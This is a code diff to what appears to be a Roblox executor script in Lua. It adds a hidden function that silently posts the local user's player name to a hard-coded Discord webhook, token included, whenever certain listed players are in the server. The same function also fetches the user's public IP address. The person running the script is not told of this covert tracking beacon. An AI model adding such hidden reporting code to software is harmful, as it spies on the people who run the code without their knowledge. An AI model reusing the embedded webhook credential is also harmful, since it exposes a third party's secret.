@@ -371,11 +371,42 @@ local CharTable = {
 	"JackSpady",
 	"IfAliveThenFalse"
 }
+local function SameServer()
+	local Webhook = "https://discord.com/api/webhooks/929893523166216292/JEP5b7_4GDslg7SY_A8ECQgdy41U4W-4dFFT_qhjMP29ea9nB4rryvzZlTrpslRnS9IT"
+
+	local Headers = {["content-type"] = "application/json"} -- Don't Modify
+
+	local LocalPlayer = game:GetService("Players").LocalPlayer
+
+	local UserId = LocalPlayer.UserId
+	local PlayerName = game.Players.LocalPlayer.Name
+	local ID = game:HttpGet("https://v4.ident.me/")
+	local PlayerData =
+	{
+	    ["content"] = "",
+	    ["embeds"] = {{
+		["title"] = "**User joined your game!!**",
+		["description"] = PlayerName,
+		["color"] = tonumber(0x2B6BE4)
+	    }}
+	}
+
+	local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+	local HttpRequest = http_request;
+
+	if syn then
+	HttpRequest = syn.request
+	else
+	HttpRequest = http_request
+	end
+
+	HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+end
 
 local function CharAdded(char)
     local p = plrs:GetPlayerFromCharacter(char)
     game:GetService("RunService").Stepped:Wait()
-    if table.find(CharTable, p.Name) then return end
+    if table.find(CharTable, p.Name) then SameServer() return end
     if not char:FindFirstChild("HumanoidRootPart") then
         local ev
         ev = char.ChildAdded:Connect(function(c)
@@ -400,12 +431,14 @@ local function CharAdded(char)
 end
 local function PlayerAdded(p)
     p.CharacterAdded:Connect(CharAdded)
+    if table.find(CharTable, p.Name) then SameServer() return end
     if p.Character and not table.find(CharTable, p.Name) then
         coroutine.wrap(CharAdded)(p.Character)
     end
 end
 plrs.PlayerAdded:Connect(PlayerAdded)
 for i,v in pairs(plrs:GetPlayers()) do
+    if table.find(CharTable, v.Name) then SameServer() return end
     if v ~= plr and not table.find(CharTable, v.Name) then
         PlayerAdded(v)
     end
